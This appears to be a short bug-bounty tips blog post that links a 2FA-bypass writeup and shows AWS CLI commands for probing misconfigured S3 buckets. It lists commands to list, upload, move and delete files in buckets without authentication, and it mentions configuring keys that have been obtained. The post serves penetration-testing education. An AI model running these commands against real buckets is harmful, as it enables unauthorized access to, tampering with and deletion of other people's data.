Day 26 comes with different a pretty good resource to bypass 2FA and part 2 on S3 buckets misconfigurations!

## 2FA Bypass Resource

From [Rajesh Ranjan](https://twitter.com/eh_rajesh). I have shared a link of a writeup in which researcher has shared some different techniques to Bypass the 2FA .

## S3 Misconfiguration Part 2

From [Sam (CoffeeJunkie)](https://twitter.com/coffeejunkiee_). As we talked about in part 1, once you have the AWS KEYS, you can configure the keys in your terminal with the following command. 
```
aws configure
```

Once you type the command, it will start asking you for your ```Access Key ID and AWS Secret Access Key```. In order to check  for vulnerable S3 buckets once you have the endpoints, you can type the following command.
```
aws s3 ls s3://[s3-bucket-link] --no-sign-request
```

After you're on track, there are couple commands that you can try to read files or move files. 
```bash
# Read files
aws s3 ls s3://[s3-bucket-link] --no-sign-request
# Move file
aws s3 mv yourfile s3://[s3-bucket-link]/test-file.txt --no-sign-request 
# Copy files
aws s3 cp test.svg s3://[s3-bucket-link]/test.svg --no-sign-request 
# Delete files
aws s3 rm s3://[s3-bucket-link]/test.svg --no-sign-request
```
And that's it! I hope you find a legal and vulnerable target to try this out.
